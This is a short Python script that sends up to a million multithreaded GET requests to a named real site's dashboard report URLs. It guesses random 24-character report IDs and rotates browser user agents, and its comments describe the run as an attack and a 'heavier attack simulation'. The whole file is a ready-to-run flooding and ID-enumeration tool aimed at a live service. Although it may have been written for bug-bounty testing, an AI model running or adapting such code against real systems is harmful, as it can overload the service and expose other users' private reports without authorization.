import requests
import threading
import random
import string
import time

# Base URL pattern with a placeholder for the random suffix
base_url_pattern = "https://bugbase.ai/dashboard/reports/{suffix}"

# Function to generate random suffixes
def generate_random_suffix(length=24):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# List of user agents to rotate through
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    # Add more user agents as needed
]

# Number of times to repeat the attack
repeat = 1000000  # Set this to a large number for a heavier attack simulation

# Function to perform the GET request
def perform_get_request(base_url_pattern, headers, i):
    try:
        random_suffix = generate_random_suffix()
        url = base_url_pattern.format(suffix=random_suffix)

        response = requests.get(url, headers=headers)

        # Print out the response code, final URL after redirect, and the payload used
        print(f"Attempt {i + 1}: Requested URL {url} - Final URL: {response.url} - Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error occurred: {e}")

# Function to handle threading
def get_with_threads(base_url_pattern, repeat):
    threads = []
    for i in range(repeat):
        headers = {
            'User-Agent': user_agents[i % len(user_agents)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
        }

        if len(threads) >= 100:  # Manage thread count
            for thread in threads:
                thread.join()
            threads = []

        thread = threading.Thread(target=perform_get_request, args=(base_url_pattern, headers, i))
        threads.append(thread)
        thread.start()

     #   time.sleep(0.001)  # Optional delay to manage rate-limiting

    # Wait for all remaining threads to complete
    for thread in threads:
        thread.join()

# Example usage
if __name__ == "__main__":
    get_with_threads(base_url_pattern, repeat)
